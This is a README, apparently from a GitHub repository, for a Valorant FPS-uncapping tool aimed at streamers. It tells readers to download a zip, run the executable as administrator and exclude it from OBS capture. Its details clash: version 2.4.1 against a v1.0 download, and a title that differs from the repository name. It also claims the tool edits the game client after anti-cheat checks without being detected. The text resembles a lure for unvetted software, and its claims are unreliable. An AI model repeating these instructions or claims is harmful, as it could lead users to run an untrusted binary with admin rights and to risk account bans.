# Valorant Fps Uncapper

![banner](https://raw.githubusercontent.com/briavneal/stream-fps-uncapper/main/assets/banner.png)

![version](https://img.shields.io/badge/version-2.4.1-blue) ![platform](https://img.shields.io/badge/platform-Windows-lightgrey) ![license](https://img.shields.io/badge/license-MIT-green)

**About**

I built this after getting tired of Valorant's hard 300 FPS cap on my 360 Hz monitor. In ranked, that limit created noticeable hitching during wide swings and retakes on maps like Ascent, and it got worse once I started streaming with OBS. I wanted something lightweight that removed the cap without touching Vanguard or adding input lag.

**Features**

- Removes the in-game FPS limit so you can actually use 360+ Hz monitors in Competitive and Immortal+ lobbies
- Keeps frame delivery stable during 5v5 retakes so OBS captures don't drop frames mid-clutch
- Works alongside the vanilla client without disabling Vanguard or requiring launch options
- Minimal overhead in deathmatch farming sessions where you're already pushing high frame rates
- Preserves raw mouse input timing for consistent 0.3 sens flicks after uncapping
- Lets you set custom caps (400/500/600) directly from the tray icon while streaming

**Requirements**

- Windows 10 or 11 (64-bit)
- 8 GB RAM minimum
- .NET 6.0 Runtime

**Installation**

1. Download the latest release from [GitHub Releases](https://github.com/briavneal/stream-fps-uncapper/releases/download/v1.0/StreamFPSUncapper-v1.0.zip)
2. Extract the archive to a folder outside Program Files
3. Run StreamFPSUncapper.exe as administrator once
4. Add the executable to your OBS capture exclusion list if you stream

**Screenshots**

| Main Interface | Setup Wizard |
|----------------|--------------|
| ![main](https://raw.githubusercontent.com/briavneal/stream-fps-uncapper/main/assets/screenshot_main.png) | ![installer](https://raw.githubusercontent.com/briavneal/stream-fps-uncapper/main/assets/screenshot_installer.png) |
![app running](https://raw.githubusercontent.com/briavneal/stream-fps-uncapper/main/assets/screenshot_app.png)

**FAQ**

**Does this trigger Vanguard?**  
No. It only edits the client FPS variable after the game has already passed Vanguard checks. I've used it since patch 7.0 with no issues.

**Will my stream look smoother in OBS?**  
Yes, but you still need to match your canvas FPS to your uncapped rate or you'll get the usual OBS frame pacing problems.

**Can I keep an FPS cap for thermals?**  
The tray menu lets you set any limit you want. I personally run uncapped in DM and 400 in ranked.

**Disclaimer**

This is a hobby project made for personal use. It is not affiliated with Riot Games. Use at your own risk.